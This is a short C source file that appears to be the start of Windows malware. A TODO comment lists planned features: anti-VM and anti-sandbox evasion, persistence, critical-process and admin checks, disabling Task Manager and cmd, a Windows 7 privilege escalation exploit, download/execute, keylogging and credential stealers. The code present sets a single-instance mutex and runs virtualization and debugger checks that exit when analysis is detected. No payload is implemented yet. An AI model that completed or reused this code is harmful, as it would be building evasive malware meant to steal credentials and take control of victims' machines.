/*
	TODO:
		- complete anti-vm/anti-sandbox
		- persistence
		- set critical process
			- check admin rights
			- http://www.rohitab.com/discuss/topic/40275-set-a-process-as-critical-process-using-ntsetinformationprocess-function/
		- disable taskmgr/cmd
			- check admin rights
		- win 7 privesc exploit
		- screen melter
		- download/execute
		- keylogging
		- credential stealers
*/

#include <stdio.h>
#include <stdarg.h>
#include <Windows.h>

#include "main.h"
#include "anti.h"

extern VOID Debug(LPCSTR fmt, ...) {
#ifdef DEBUG
	CHAR szMsg[BUFSIZ];
	va_list args;

	va_start(args, fmt);
	vsprintf(szMsg, fmt, args);

	MessageBox(NULL, szMsg, NAME, MB_OK);

	va_end(args);
#endif
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
	CreateMutex(NULL, TRUE, NAME);
	if (GetLastError() == ERROR_ALREADY_EXISTS)
		ExitProcess(0);

#ifdef ANTI_VIRTUALIZATION
	CheckForVirtualization();
#endif

#ifdef ANTI_DEBUGGING
	if (CheckForDebuggers() == TRUE)
		ExitProcess(0);
#endif
	
	// get version info

	Debug("Hello");

	return 0;
}